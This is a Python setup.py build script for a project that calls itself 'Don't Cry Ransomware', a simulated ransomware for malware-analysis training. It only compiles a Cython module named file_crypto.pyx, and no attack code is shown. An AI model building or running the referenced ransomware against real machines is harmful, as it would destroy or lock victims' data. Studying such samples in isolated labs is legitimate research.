################################################################################
#                             Don't Cry Ransomware                             #
#                          ! EDUCATIONAL PURPOSES ONLY !                       #
################################################################################
# DISCLAIMER: This is a simulated ransomware (DCry), written for cybersecurity
# research, ethical hacking education, and malware analysis training only.
# It mimics behavior of real ransomware but must NOT be used for illegal or
# unauthorized activity. Run only in isolated environments (e.g., sandbox or VM)
# under supervision of cybersecurity professionals.
# The authors assume no liability for any misuse or damage caused.

from Cython.Build import cythonize
from setuptools import setup

setup(
    ext_modules=cythonize(
        "src/file_crypto.pyx", compiler_directives={"language_level": "3"}
    )
)
